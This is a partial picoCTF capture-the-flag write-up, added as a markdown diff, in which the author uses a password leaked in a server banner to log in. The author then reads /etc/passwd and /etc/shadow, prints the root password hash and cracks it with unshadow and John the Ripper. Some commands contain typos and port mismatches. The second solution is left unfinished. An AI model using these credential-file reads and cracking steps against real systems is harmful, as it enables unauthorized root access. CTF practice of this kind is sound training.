@@ -1,0 +1,109 @@
+# Challege reads as follow 
+
+Can you abuse the banner?
+The server has been leaking some crucial information on 
+tethys.picoctf.net 57019. Use the leaked information to get to the server.
+
+To connect to the running application use 
+nc tethys.picoctf.net 61514. From the above information abuse the machine and find the flag in the /root directory.
+
+# let's connect with first server and obtain the leaking information 
+
+upon connecting with leaking server, we got the following credentials:
+
+# nc ethys.picoctf.net 57019
+
+SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234 
+
+now connect with another server using the password , provided by leaking server : 
+
+muneer1631-picoctf@webshell:~$ nc tethys.picoctf.net 54357
+*************************************
+**************WELCOME****************
+*************************************
+
+what is the password? 
+My_Passw@rd_@1234
+
+What is the top cyber security conference in the world?
+DEF CON
+
+the first hacker ever was known for phreaking(making free phone calls), who was it?
+John Draper
+
+player@challenge:~$ 
+
+# Now we're in .............. 
+
+# From here , I solved it in two ways. First as the questions suggests  the flag is in root folder. 
+let's check the permission of flag.txt 
+
+__________________________________________________________________________________
+player@challenge:/root$ ls -la 
+ls -la 
+total 16
+drwxr-xr-x 1 root root    6 Mar  9 16:39 .
+drwxr-xr-x 1 root root   29 Apr 17 10:17 ..
+-rw-r--r-- 1 root root 3106 Apr  9  2018 .bashrc
+-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
+-rwx------ 1 root root   46 Mar  9 16:39 flag.txt
+-rw-r--r-- 1 root root 1317 Feb  7 17:25 script.py
+player@challenge:/root$  
+____________________________________________________________________________________
+
+As we can see, it you need root Privileges to read the file . 
+As I described above , I solved it in two ways. 
+
+1. Crack the password of root  and enter as root to read the contents of the file 
+2. use the Hint provided and following along the way to solve it. 
+
+# Firstly am going to crack the password of root (First way)
+
+read users ( cat /etc/passwd)  and copy the root username and save it into a text file. 
+______________________________________________________________________________
+player@challenge:/root$ cat /etc/passwd
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+_______________________________________________________________________________
+
+Similary read the hash of passwords stored in /ect/shadow
+player@challenge:~$ cat /etc/shadow
+cat /etc/shadow
+root:$6$6QFbdp2H$R0BGBJtG0DlGFx9H0AjuQNOhlcssBxApM.CjDEiNzfYkVeJRNy2d98SDURNebD5/l4Hu2yyVk.ePLNEg/56DV0:19791:0:99999:7:::
+___________________________________________________________________________________________________________________________
+
+Use "unshadow" tool which merges password and shadow files into one, typically for cracking passwords. As 
+you saved the username of root and hash of password, Take help of "unshadow" commnad to merge both files.
+
+unshadow name.txt password.txt > passwords.txt
+
+Now , you've merged file named as passwords. 
+
+# Did you hear about John ?
+NO, "John the Ripper is a powerful password cracking tool often used for security testing and analysis."
+
+Provide the path where John (Already Installed in Kali Linux) and the password file 
+_____________________________________________________________________________________________
+┌──(muneer㉿kali)-[~/Desktop]
+└─$ john /usr/sbin/ password 
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 2 OpenMP threads
+Proceeding with single, rules:Single
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance.
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:/usr/share/john/password.lst
+*iloveyou         (root)*   
+1g 0:00:00:01 DONE 2/3 (2024-04-16 21:07) 0.6211g/s 598.7p/s 598.7c/s 598.7C/s 123456..john
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+__________________________________________________________________________________________
+
+Oh , you did it buddy. "iloveyou" is the password of root. Switch to root and read the contents of the file. 
+
+# let's go for another way (second approach to solve it)
+
+I will continue it latter ................
+
